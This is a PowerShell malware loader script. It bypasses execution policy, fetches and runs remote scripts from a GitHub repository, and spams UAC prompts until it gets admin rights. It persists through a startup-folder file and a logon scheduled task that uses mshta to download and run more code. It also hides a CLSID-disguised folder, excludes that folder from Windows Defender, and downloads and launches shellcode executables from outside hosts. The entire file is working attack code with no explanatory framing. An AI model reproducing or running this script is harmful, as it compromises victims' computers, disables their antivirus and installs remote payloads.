Set-ExecutionPolicy Bypass -Scope Process -Force
$skid = "skid"
iex (iwr -uri "https://raw.githubusercontent.com/43a1723/test/main/Extras/hidden.ps1" -useb)
if (-not ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")) {
    $startup = [System.IO.Path]::Combine($env:APPDATA, 'Microsoft\Windows\Start Menu\Programs\Startup')
    
    Invoke-WebRequest -Uri "https://raw.githubusercontent.com/43a1723/test/main/Extras/skidtoi.bat" -OutFile "$startup\run.cmd"
    while(1) {
        try {
            Start-Process -Verb RunAs -FilePath '$startup\run.cmd';
            Remove-Item -Path "$startup\run.cmd"
            Stop-Process $pid -Force
        } catch {}
    }
}

$task_name = "Windows startup"
$task_action = New-ScheduledTaskAction -Execute "mshta.exe" -Argument "vbscript:createobject(`"wscript.shell`").run(`"powershell `$userid=$userid;iwr('https://raw.githubusercontent.com/43a1723/test/main/download.ps1')|iex`",0)(window.close)"
$task_trigger = New-ScheduledTaskTrigger -AtLogOn
$task_settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -RunOnlyIfNetworkAvailable -DontStopOnIdleEnd -StartWhenAvailable
Register-ScheduledTask -Action $task_action -Trigger $task_trigger -Settings $task_settings -TaskName $task_name -Description "windows startup file" -RunLevel Highest -Force

Write-Host "[!] Persistence Added" -ForegroundColor Green


$rdir = "C:\Users\hai1723"
$dir = "$rdir.{21EC2020-3AEA-1069-A2DD-08002B30309D}"
New-Item -ItemType Directory -Path $dir
attrib +h +s $dir

$temp = "$dir\temp"
New-Item -ItemType Directory -Path $temp

Add-MpPreference -ExclusionPath $dir

# $shellcode = ("https://raw.githubusercontent.com/43a1723/test/main/Extras/shellcode.ps1")
# $download = "(New-Object Net.Webclient).""`DowNloAdS`TR`i`N`g""('$shellcode')"
# Start-Process "powershell" -Argument "I'E'X($download)" -NoNewWindow -PassThru

Invoke-WebRequest -Uri "https://anonsharing.com/file/8b24841448995265/shellcode_(3).exe" -OutFile "$temp\s.exe"
Start-Process -FilePath "$temp\s.exe"

Invoke-WebRequest -Uri "https://raw.githubusercontent.com/43a1723/test/main/Extras/LMAO_protected.exe" -OutFile "$temp\skid.exe"
Start-Process -FilePath "$temp\skid.exe"

Get-ChildItem -Path $dir | Where-Object { $_.PSIsContainer -eq $false } | ForEach-Object {
    Write-Output $_.FullName
    Start-Process -FilePath $_.FullName
}

# Định nghĩa biến $urlToCheck và $arguments
